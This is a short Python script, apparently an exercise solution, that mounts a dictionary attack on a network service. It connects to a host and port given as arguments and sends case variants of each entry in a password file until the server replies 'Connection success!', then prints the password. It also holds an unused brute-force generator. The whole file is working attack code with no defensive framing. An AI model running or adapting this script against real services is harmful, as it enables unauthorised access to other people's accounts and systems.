mport socket, sys
from string import ascii_lowercase, digits
from itertools import product

args = sys.argv
chars = ascii_lowercase+digits

def brute_force():
    for i in range(1, len(chars) + 1):
        for message in product(chars, repeat = i):
            message = "".join(message)
            yield message

def get_password_list():
    with open("passwords.txt") as file:
        for line in file:
            line = line.strip("\n")
            list = map(lambda x: "".join(x), product(*([letter.lower(), letter.upper()]
                                                       for letter in line)))
            for pw in list:
                yield pw


with socket.socket() as client_socket:
    addresse = (args[1], int(args[2]))
    recieve = None
    client_socket.connect(addresse)
    message = get_password_list()
    while 1:
        pw = next(message)
        client_socket.send(pw.encode())
        recieve = client_socket.recv(1024)
        recieve = recieve.decode()
        if recieve == "Connection success!":
            break

print(pw)
